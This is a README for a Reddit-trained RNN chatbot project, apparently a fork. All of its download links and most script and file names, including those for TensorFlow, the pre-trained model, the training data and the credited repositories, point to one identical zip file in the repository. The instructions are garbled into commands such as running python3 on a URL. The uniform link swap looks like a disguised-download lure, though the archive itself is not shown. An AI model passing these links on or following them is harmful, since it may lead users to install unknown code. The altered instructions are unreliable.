...
```
$ python3 https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip
Creating model...
Restoring weights...
...
- **Install [TensorFlow](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip)** for Python 3. To run a pretrained model, the CPU-only installation should suffice. If you want to train your own models, you'll need the GPU installation of TensorFlow (and a powerful CUDA-compatible GPU).

- Clone this project to your computer.

### Run my pre-trained model

- **Download [my pre-trained model](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip)** (2.3 GB). The zip file extracts into a folder named "reddit". Place that folder into the "models" directory of this project.

- **Run the chatbot**. Open a terminal session and run `python3 https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip`. Warning: this pre-trained model was trained on a diverse set of frequently off-color Reddit comments. It can (and eventually will) say things that are offensive, disturbing, bizarre or sexually explicit. It may insult minorities, it may call you names, it may accuse you of being a pedophile, it may try to seduce you. Please don't use the chatbot if these possibilities would distress you!

Try playing around with the arguments to `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` to obtain better samples:

- **beam_width**: By default, `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` will use beam search with a beam width of 2 to sample responses. Set this higher for more careful, more conservative (and slower) responses, or set it to 1 to disable beam search.
...
- **Use pre-formatted Reddit training data.** This is what the pre-trained model was trained on.
  ...
  [Download the training data](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip) (2.1 GB). Unzip the monolithic zip file. You'll be left with a folder named "reddit" containing 34 files named "output https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip", "output https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip" etc. Do not extract those individual bzip2 files. Instead, place the whole "reddit" folder that contains those files inside the `data` folder of the repo. The first time you run `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` on this data, it will convert the raw data into numpy tensors, compress them and save them back to disk, which will create files named "https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip" through "https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip" (as well as a "https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip" file and a "https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip" file). This will fill another ~5 GB of disk space, and will take about half an hour to finish.

- **Generate your own Reddit training data.** If you would like to generate training data from raw Reddit archives, download a torrent of Reddit comments from the torrent links [listed here](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip). The comments are available in annual archives, and you can download any or all of them (~304 GB compressed in total). Do not extract the individual bzip2 (.bz2) files contained in these archives.

  Once you have your raw reddit data, place it in the `reddit-parse/reddit_data` subdirectory and use the `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` script included in the project file to convert them into compressed text files of appropriately formatted conversations. This script chooses qualifying comments (must be under 200 characters, can't contain certain substrings such as 'http://', can't have been posted on certain subreddits) and assembles them into conversations of at least five lines. Coming up with good rules to curate conversations from raw reddit data is more art than science. I encourage you to play around with the parameters in the included `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` file, or to mess around with the parsing script itself, to come up with an interesting data set.

  Please be aware that there is a *lot* of Reddit data included in the torrents. It is very easy to run out of memory or hard drive space. I used the entire archive (~304 GB compressed), and ran the `https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip` script with the configuration I included as the default, which holds a million comments (several GB) in memory at a time, takes about a day to run on the entire archive, and produces 2.1 GB of bzip2-compressed output. When training the model, this raw data will be converted into numpy tensors, compressed, and saved back to disk, which consumes another ~5 GB of hard drive space. I acknowledge that this may be overkill relative to the size of the model.
...
Thanks to Andrej Karpathy for his [char-rnn](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip) repo, and to Sherjil Ozair for his [TensorFlow port](https://github.com/yashugupta786/chatbot-rnn/raw/refs/heads/master/data/scotus/chatbot-rnn-2.9.zip) of char-rnn, which this repo is based on.
